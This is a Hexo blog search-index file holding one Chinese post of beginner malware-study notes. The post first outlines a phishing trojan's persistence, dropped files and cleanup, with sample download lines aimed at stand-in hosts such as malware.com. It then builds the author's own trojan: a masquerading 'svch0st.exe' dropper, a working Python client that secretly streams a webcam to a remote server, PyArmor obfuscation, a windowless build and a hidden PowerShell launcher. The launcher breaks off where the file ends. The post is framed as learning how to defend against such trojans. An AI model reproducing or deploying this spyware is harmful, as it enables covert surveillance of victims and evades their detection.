<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>0基础入门病毒学习笔记</title>
      <link href="/2025/06/15/re/0%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%97%85%E6%AF%92%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/06/15/re/0%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%97%85%E6%AF%92%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="0基础入门病毒学习笔记"><a href="#0基础入门病毒学习笔记" class="headerlink" title="0基础入门病毒学习笔记"></a>0基础入门病毒学习笔记</h1><p><strong>前言</strong></p><p>这篇文章主要是笔者作为一个小白第一次开始了解病毒逆向做的笔记，打算跟着52破解的 <strong>定向财务的钓鱼木马分析</strong>这篇文章来，先将木马的启动流程走一遍，由于没有找到原木马文件，我也只能先云分析，之后自己写一个简单的木马来模拟攻击者</p><h2 id="病毒检测"><a href="#病毒检测" class="headerlink" title="病毒检测"></a>病毒检测</h2><p>如果我们遇见一个木马软件，要执行的操作是什么呢，没错就是判断他是不是一个病毒，你可以选择自己分析，使用逆向工具在虚拟机或者沙盒中一步一步对病毒进行分析，观察他有没有对系统进行什么敏感的操作，当然我们也可以使用一些检测沙盒比如<a href="https://www.virustotal.com/gui/home/upload">VirusTotal - 主页</a>快速的对软件的安全性进行检测</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611185822899.png" alt="image-20250611185822899"></p><h2 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h2><p>那么我们开始分析</p><p>病毒执行流程总览</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611185037490.png" alt="image-20250611185037490"></p><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>文件的开始都是从一个双击开始的，当你面对一个可疑文件没有任何检测的双击便是悲剧的开场</p><h3 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h3><p>了解持久化之前我们要先了解一个东西叫做注册表</p><h4 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h4><p>注册表是 Windows 操作系统中一个重要的数据库，用于存储系统和应用程序的配置信息、设置、选项以及其他必要的数据。它就像是系统的 “中央配置仓库”，记录着几乎所有软件和硬件的相关信息，确保系统和程序能够正常运行</p><p>注册表采用类似文件系统的 “树形结构”，由以下 5 个主要根键（Hive）组成，每个根键下包含多个子键和值项：</p><table><thead><tr><th>根键名称</th><th>作用描述</th></tr></thead><tbody><tr><td><strong>HKEY_LOCAL_MACHINE (HKLM)</strong></td><td>存储计算机的硬件和软件的系统级配置，对所有用户生效。</td></tr><tr><td><strong>HKEY_CURRENT_USER (HKCU)</strong></td><td>存储当前登录用户的个性化设置，如桌面偏好、应用程序配置等。</td></tr><tr><td><strong>HKEY_CLASSES_ROOT (HKCR)</strong></td><td>管理文件类型关联（如.docx 对应 Word 程序）和 COM 组件注册信息。</td></tr><tr><td><strong>HKEY_CURRENT_CONFIG (HKCC)</strong></td><td>存储当前硬件配置文件的信息，如显示器分辨率、打印机设置等。</td></tr><tr><td><strong>HKEY_USERS (HKU)</strong></td><td>包含所有用户账户的配置信息，HKCU 本质上是 HKU 下某个用户配置的快捷方式。</td></tr></tbody></table><p>系统启动项</p><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run：当前用户的启动项<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run：所有用户的启动项<br>这里我们只是简单了解，以后再深入，我们明白病毒通过注册表能实现开机自启等功能就行了</p><p>参考文章中是使用ida动态查找到的注册表信息</p><h3 id="释放配置文件"><a href="#释放配置文件" class="headerlink" title="释放配置文件"></a>释放配置文件</h3><p>生成并释放配置文件包含控制程序所需要的配置</p><table><thead><tr><th>类型</th><th>技术特征</th><th>典型用途</th></tr></thead><tbody><tr><td><strong>文本配置文件</strong>（<code>.ini</code> <code>.cfg</code> <code>.txt</code>）</td><td>以明文或简单加密存储参数，可直接用记事本查看 例：<code>[Server] Host=hacker.com Port=8080</code></td><td>存储网络通信参数、模块加载路径</td></tr><tr><td><strong>二进制配置文件</strong>（<code>.dat</code> <code>.bin</code> <code>.tmp</code>）</td><td>包含 PE 文件片段、加密数据或编译后的指令 需用 Hex 编辑器查看 16 进制数据</td><td>存储恶意代码本体、加密密钥</td></tr><tr><td><strong>脚本配置文件</strong>（<code>.ps1</code> <code>.bat</code> <code>.vbs</code>）</td><td>包含可执行脚本指令 例：<code>powershell -c &quot;Invoke-WebRequest http://malware.com/install&quot;</code></td><td>执行下载、文件修改等操作</td></tr><tr><td><strong>注册表配置</strong>（通过注册表项存储）</td><td>利用注册表键值存储配置信息 例：<code>HKEY_CURRENT_USER\Software\AppData\Config</code> 存储启动路径</td><td>实现系统级持久化配置</td></tr></tbody></table><h3 id="释放控制程序"><a href="#释放控制程序" class="headerlink" title="释放控制程序"></a>释放控制程序</h3><p>在于配置文件相同的目录下释放控制文件</p><h3 id="执行控制程序"><a href="#执行控制程序" class="headerlink" title="执行控制程序"></a>执行控制程序</h3><p>执行刚刚释放的控制程序，使用<code>-Unpack-logDir&quot;C:\Users\username\AppData\Local\Temp\AgentInstall&quot;-v&quot;4.85.414.0&quot;</code>创建进程，安装IP-gurrd程序</p><p><strong>IP-gurrd</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611202424387.png" alt="image-20250611202424387"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611202509703.png" alt="image-20250611202509703"></p><h3 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h3><p>删除配置文件和控制程序</p><h3 id="个人感悟"><a href="#个人感悟" class="headerlink" title="个人感悟"></a>个人感悟</h3><p>木马在执行的过程中，执行了权限位置，确保开机自启监控程序，配置文件和控制程序更多的想是一个安装程序，实现了监控程序的安装，而最终会删除安装程序，形象的比喻的话就像是装有间谍的木马被带进城（双击），夜深人静时，间谍从木马中出来（释放配置文件和释放控制程序），并藏在城中，最后木马离开（清除痕迹），就这那样城中被带进了一只眼睛监控所有人</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>推荐文章<a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=2024570&extra=page=1&filter=typeid&typeid=62">【逆向复现】PyInstaller简单复现 - 吾爱破解 - 52pojie.cn</a>标题简单，内容不简单，对入门的我而言受益匪浅</p><p>工具总结</p><p>pycdc：<a href="https://github.com/zrax/pycdc">https://github.com/zrax/pycdc</a> 将pyc文件转为py</p><p>pyarmor：<a href="https://pyarmor.readthedocs.io/en/latest/%E6%B7%B7%E6%B7%86py%E4%BB%A3%E7%A0%81">https://pyarmor.readthedocs.io/en/latest/混淆py代码</a></p><p>pyarmor-unpcker：<a href="https://github.com/Svenskithesource/PyArmor-Unpacker">https://github.com/Svenskithesource/PyArmor-Unpacker</a> 解混淆py代码</p><p>pyarmor-tooling：<a href="https://github.com/GDATAAdvancedAnalytics/Pyarmor-Tooling%E8%A7%A3%E6%B7%B7%E6%B7%86py%E4%BB%A3%E7%A0%81">https://github.com/GDATAAdvancedAnalytics/Pyarmor-Tooling解混淆py代码</a></p><p>pyinstxtractor：<a href="https://github.com/extremecoders-re/pyinstxtractor%E5%B0%86exe%E8%BD%ACpyc">https://github.com/extremecoders-re/pyinstxtractor将exe转pyc</a></p><p><a href="https://www.52pojie.cn/home.php?mod=space&uid=1029819">LovenSar</a>师傅的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"># Import required modules for OS operations and subprocess management</span><br><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">def execute_command(command):</span><br><span class="line">    &quot;&quot;&quot;Execute command and return (stdout, stderr, returncode)&quot;&quot;&quot;</span><br><span class="line">    # Create a new process to execute the command via cmd.exe</span><br><span class="line">    process = subprocess.Popen(</span><br><span class="line">        [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, command],  # Command execution through cmd interpreter</span><br><span class="line">        shell=True,  # Enable shell execution environment</span><br><span class="line">        stdout=subprocess.PIPE,  # Capture standard output</span><br><span class="line">        stderr=subprocess.PIPE,  # Capture error output</span><br><span class="line">        universal_newlines=True  # Use universal newline decoding</span><br><span class="line">    )</span><br><span class="line">    try:</span><br><span class="line">        # Wait for process completion with 5-second timeout</span><br><span class="line">        stdout, stderr = process.communicate(timeout=5)</span><br><span class="line">        return stdout, stderr, process.returncode</span><br><span class="line">    except subprocess.TimeoutExpired:</span><br><span class="line">        # Terminate process if timeout occurs</span><br><span class="line">        process.kill()</span><br><span class="line">        return &quot;&quot;, &quot;Command timeout&quot;, -1</span><br><span class="line"></span><br><span class="line"># Create minimal PE file stub in C:\ (requires admin privileges)</span><br><span class="line">create_file_cmd = &#x27;echo &quot;MZ&quot; &gt; C:\\svch0st.exe&#x27;</span><br><span class="line"># Execute file creation command and capture results</span><br><span class="line">stdout, stderr, code = execute_command(create_file_cmd)</span><br><span class="line"></span><br><span class="line"># Verify file creation success/failure</span><br><span class="line">if code == 0:</span><br><span class="line">    print(&quot;File creation succeeded&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;File creation failed: &#123;stderr&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Command to launch Windows calculator</span><br><span class="line">launch_calc_cmd = &#x27;calc.exe&#x27;</span><br><span class="line"># Execute calculator launch command</span><br><span class="line">stdout, stderr, code = execute_command(launch_calc_cmd)</span><br><span class="line"></span><br><span class="line"># Verify calculator launch success/failure</span><br><span class="line">if code == 0:</span><br><span class="line">    print(&quot;Calculator launched successfully&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;Calculator launch failed: &#123;stderr&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Test command execution using subprocess.run()</span><br><span class="line">test_command = &#x27;echo Hello Python!&#x27;</span><br><span class="line">result = subprocess.run(</span><br><span class="line">    [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, test_command],  # Command list for execution</span><br><span class="line">    shell=True,  # Maintain shell context</span><br><span class="line">    capture_output=True,  # Capture both stdout/stderr</span><br><span class="line">    text=True  # Return output as string instead of bytes</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># Check test command execution status</span><br><span class="line">if result.returncode == 0:</span><br><span class="line">    print(&quot;Test command succeeded&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;Test command failed: &#123;result.stderr&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Optional cleanup command (disabled by default)</span><br><span class="line"># os.remove(&quot;C:\\svch0st.exe&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">def execute_command(command):</span><br><span class="line">    &quot;&quot;&quot;执行命令并返回(标准输出, 错误输出, 返回码)&quot;&quot;&quot;</span><br><span class="line">    # 创建新进程通过cmd.exe执行命令</span><br><span class="line">    process = subprocess.Popen(</span><br><span class="line">        [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, command],  # 通过cmd解释器执行命令</span><br><span class="line">        shell=True,  # 启用shell执行环境</span><br><span class="line">        stdout=subprocess.PIPE,  # 捕获标准输出</span><br><span class="line">        stderr=subprocess.PIPE,  # 捕获错误输出</span><br><span class="line">        universal_newlines=True  # 使用通用换行符解码</span><br><span class="line">    )</span><br><span class="line">    try:</span><br><span class="line">        # 等待进程完成，设置5秒超时</span><br><span class="line">        stdout, stderr = process.communicate(timeout=5)</span><br><span class="line">        return stdout, stderr, process.returncode</span><br><span class="line">    except subprocess.TimeoutExpired:</span><br><span class="line">        # 超时则终止进程</span><br><span class="line">        process.kill()</span><br><span class="line">        return &quot;&quot;, &quot;命令执行超时&quot;, -1</span><br><span class="line"></span><br><span class="line"># 在C:\创建最小PE文件存根(需要管理员权限)</span><br><span class="line">create_file_cmd = &#x27;echo &quot;MZ&quot; &gt; C:\\svch0st.exe&#x27;</span><br><span class="line"># 执行文件创建命令并捕获结果</span><br><span class="line">stdout, stderr, code = execute_command(create_file_cmd)</span><br><span class="line"></span><br><span class="line"># 验证文件创建成功/失败</span><br><span class="line">if code == 0:</span><br><span class="line">    print(&quot;文件创建成功&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;文件创建失败: &#123;stderr&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 启动Windows计算器的命令</span><br><span class="line">launch_calc_cmd = &#x27;calc.exe&#x27;</span><br><span class="line"># 执行计算器启动命令</span><br><span class="line">stdout, stderr, code = execute_command(launch_calc_cmd)</span><br><span class="line"></span><br><span class="line"># 验证计算器启动成功/失败</span><br><span class="line">if code == 0:</span><br><span class="line">    print(&quot;计算器启动成功&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;计算器启动失败: &#123;stderr&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 使用subprocess.run()测试命令执行</span><br><span class="line">test_command = &#x27;echo Hello Python!&#x27;</span><br><span class="line">result = subprocess.run(</span><br><span class="line">    [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, test_command],  # 要执行的命令列表</span><br><span class="line">    shell=True,  # 保持shell上下文</span><br><span class="line">    capture_output=True,  # 捕获标准输出和错误输出</span><br><span class="line">    text=True  # 以字符串而非字节形式返回输出</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 检查测试命令执行状态</span><br><span class="line">if result.returncode == 0:</span><br><span class="line">    print(&quot;测试命令执行成功&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;测试命令执行失败: &#123;result.stderr&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 可选的清理命令(默认禁用)</span><br><span class="line"># os.remove(&quot;C:\\svch0st.exe&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="开始-1"><a href="#开始-1" class="headerlink" title="开始"></a>开始</h3><p>在认真研读完<a href="https://www.52pojie.cn/home.php?mod=space&uid=1029819">LovenSar</a>师傅的代码后我决定模拟一个攻击者来一遍攻击者的心路，未知攻焉知防</p><h3 id="打开终端"><a href="#打开终端" class="headerlink" title="打开终端"></a>打开终端</h3><p>在python中打开终端需要开启一个子进程，使用subprocess库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">process = subprocess.Popen(</span><br><span class="line">        [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;,&#x27;ipconfig&#x27;]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这是一条最简单的打开终端并执行的代码，打开终端执行ipconfig退出</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611215507770.png" alt="image-20250611215507770"></p><p><strong>process的全部参数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"># 创建子进程执行命令</span><br><span class="line">process = subprocess.Popen(</span><br><span class="line">    [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, &#x27;ipconfig&#x27;],  # 命令参数列表</span><br><span class="line">    # 其他可选参数：</span><br><span class="line">    # stdout=subprocess.PIPE,  # 捕获标准输出</span><br><span class="line">    # stderr=subprocess.PIPE,  # 捕获错误输出</span><br><span class="line">    # shell=True,              # 是否使用shell执行</span><br><span class="line">    # cwd=None,                # 工作目录</span><br><span class="line">    # env=None,                # 环境变量</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 等待进程完成（可选）</span><br><span class="line"># process.wait()</span><br></pre></td></tr></table></figure><p><strong>cmd的参数表</strong></p><table><thead><tr><th><code>/c</code></th><th>执行指定命令后立即退出 cmd 窗口</th></tr></thead><tbody><tr><td><code>/k</code></td><td>执行指定命令但不退出 cmd 窗口，保持命令提示符打开</td></tr><tr><td><code>/s</code></td><td>修改命令行处理方式，通常与<code>/c</code>或<code>/k</code>结合使用</td></tr><tr><td><code>/q</code></td><td>关闭回显功能，不显示命令执行过程</td></tr><tr><td><code>/d</code></td><td>启动时跳过执行<code>AutoRun</code>注册表项中的命令</td></tr><tr><td><code>/a</code></td><td>设置输出到控制台的文本为 ANSI 字符集</td></tr><tr><td><code>/u</code></td><td>设置输出到控制台的文本为 Unicode 字符集</td></tr><tr><td><code>/t:fg</code></td><td>设置命令提示符窗口的前景色 (f) 和背景色 (g)，如<code>/t:0A</code>表示黑底绿字</td></tr><tr><td><code>/e:on</code></td><td>启用命令扩展功能（默认启用）</td></tr><tr><td><code>/e:off</code></td><td>禁用命令扩展功能</td></tr><tr><td><code>/f:on</code></td><td>启用文件名完成功能</td></tr><tr><td><code>/f:off</code></td><td>禁用文件名完成功能</td></tr><tr><td><code>/v:on</code></td><td>启用延迟环境变量扩展</td></tr><tr><td><code>/v:off</code></td><td>禁用延迟环境变量扩展</td></tr></tbody></table><h3 id="弹出计算器"><a href="#弹出计算器" class="headerlink" title="弹出计算器"></a>弹出计算器</h3><p>终端其中计算器的指令是calc.exe，我们把开启子进程写成一个函数实现弹出计算器，证明可以打开终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">def startprocess(content):</span><br><span class="line">    process = subprocess.Popen(</span><br><span class="line">        [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, content],  # 命令参数列表</span><br><span class="line">        # 其他可选参数：</span><br><span class="line">        # stdout=subprocess.PIPE,  # 捕获标准输出</span><br><span class="line">        # stderr=subprocess.PIPE,  # 捕获错误输出</span><br><span class="line">        # shell=True,              # 是否使用shell执行</span><br><span class="line">        # cwd=None,                # 工作目录</span><br><span class="line">        # env=None,                # 环境变量</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # 等待进程完成（可选）</span><br><span class="line">    process.wait()</span><br><span class="line"></span><br><span class="line">startprocess(&#x27;calc.exe&#x27;)</span><br></pre></td></tr></table></figure><p>成功弹出</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611220302800.png" alt="image-20250611220302800"></p><h3 id="创建可执行文件"><a href="#创建可执行文件" class="headerlink" title="创建可执行文件"></a>创建可执行文件</h3><p>我们尝试使用终端创建一个可执行文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_file_cmd = &#x27;echo &quot;MZ&quot; &gt; C:\\svch0st.exe&#x27;</span><br></pre></td></tr></table></figure><p>借鉴为windows执行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_creat=&#x27;echo MZ &gt; C:\svch0st.exe&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">def startprocess(content):</span><br><span class="line">    process = subprocess.Popen(</span><br><span class="line">        [&#x27;cmd.exe&#x27;, &#x27;/c&#x27;, content],  # 命令参数列表</span><br><span class="line">        # 其他可选参数：</span><br><span class="line">        # stdout=subprocess.PIPE,  # 捕获标准输出</span><br><span class="line">        stderr=subprocess.PIPE,  # 捕获错误输出</span><br><span class="line">        # shell=True,              # 是否使用shell执行</span><br><span class="line">        # cwd=None,                # 工作目录</span><br><span class="line">        # env=None,                # 环境变量</span><br><span class="line">    )</span><br><span class="line">    # 等待进程完成（可选）</span><br><span class="line">    stderr=process.wait()</span><br><span class="line">    return stderr</span><br><span class="line">file_creat=&quot;echo &#x27;MZ&#x27; &gt; G:\svch0st.exe&quot;</span><br><span class="line">err=startprocess(file_creat)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250611221733564.png" alt="image-20250611221733564"></p><p>成功创建（我没有放在c盘因为c盘需要管理员模式，我直接在ide运行就没用管理员模式）</p><h3 id="监控软件"><a href="#监控软件" class="headerlink" title="监控软件"></a>监控软件</h3><p>由于笔者的基础比较薄弱，所以选择只写一个最简单的监控程序，实现可以打开对方摄像头并将数据使用套接字传输过来的功能就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">def capture_and_send(server_address):</span><br><span class="line">    cap = cv2.VideoCapture(0)</span><br><span class="line">    if not cap.isOpened():</span><br><span class="line">        print(&quot;无法打开摄像头&quot;)</span><br><span class="line">        return</span><br><span class="line">    </span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        client_socket.connect(server_address)</span><br><span class="line">        print(f&quot;已连接到服务器 &#123;server_address&#125;&quot;)</span><br><span class="line">        </span><br><span class="line">        while True:</span><br><span class="line">            ret, frame = cap.read()</span><br><span class="line">            if not ret:</span><br><span class="line">                print(&quot;无法获取视频帧&quot;)</span><br><span class="line">                break</span><br><span class="line">            # 编码图像</span><br><span class="line">            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]</span><br><span class="line">            _, frame_encoded = cv2.imencode(&#x27;.jpg&#x27;, frame, encode_param)</span><br><span class="line">            string_data = frame_encoded.tobytes()</span><br><span class="line">            # 修复1: 使用固定4字节长度头</span><br><span class="line">            header = struct.pack(&quot;!I&quot;, len(string_data))</span><br><span class="line">            # 修复2: 合并发送避免TCP分片问题</span><br><span class="line">            client_socket.sendall(header + string_data)</span><br><span class="line">            # 可选: 本地预览</span><br><span class="line">            # cv2.imshow(&#x27;Local Preview&#x27;, frame)</span><br><span class="line">            if cv2.waitKey(1) &amp; 0xFF == ord(&#x27;q&#x27;):</span><br><span class="line">                break</span><br><span class="line">                </span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;连接错误: &#123;e&#125;&quot;)</span><br><span class="line">    finally:</span><br><span class="line">        client_socket.close()</span><br><span class="line">        cap.release()</span><br><span class="line">        cv2.destroyAllWindows()</span><br><span class="line">        print(&quot;连接已关闭&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    server_ip = &#x27;&#x27;  # 替换为服务器实际IP</span><br><span class="line">    capture_and_send((server_ip, 8001))</span><br></pre></td></tr></table></figure><p>这个代码是笔者配合LLM写的，其中要注意的是如果没有有公网ip的服务器进行端口转发的话，这个代码就只能在局域网中有效，因为一个子网的ip不能直接访问另一个子网ip，但是子网能访问公网，所以我们通过客户端将数据传输到公网的服务器上，再由公网上的服务器将数据传输到我们的服务端上，具体的实现我是使用阿里云的服务器，用的Xshell进行ssh连接，服务器和服务端的连接我使用的是openVPN</p><p>使用pyarmor加密脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyarmor gen --pack=onefile client.py</span><br></pre></td></tr></table></figure><ul><li><code>--pack=onefile</code>：告诉 PyArmor 准备 PyInstaller 单文件打包。</li></ul><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250614213846572.png" alt="image-20250614213846572"></p><p>使用editbin.exe将文件设为无窗口</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250614214015683.png" alt="image-20250614214015683"></p><h3 id="木马实现"><a href="#木马实现" class="headerlink" title="木马实现"></a>木马实现</h3><p>开始我想就用python实现部署，但是由于使用的是python打包所以程序是相当的大</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250615124150376.png" alt="image-20250615124150376"></p><p>那要怎么实现缩小呢</p><p>这时候我想起了在吾爱破解上的文章<a href="https://www.52pojie.cn/thread-2035784-1-1.html">论黑客如何从bat到py到donut到ps1层层包裹木马，揭秘木马神秘运行流程 - 吾爱破解 - 52pojie.cn</a>这个大佬分析的病毒样本就是通过批处理文件实现打开一个无害链接作为混淆，然后再链接远程服务器实现下载运行病毒文件，目前我基础比薄弱就只能写一个比较简单的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">if &quot;%1&quot; neq &quot;hidden&quot; (</span><br><span class="line">    powershell -windowstyle hidden -command &quot;Start-Process cmd -ArgumentList &#x27;/c 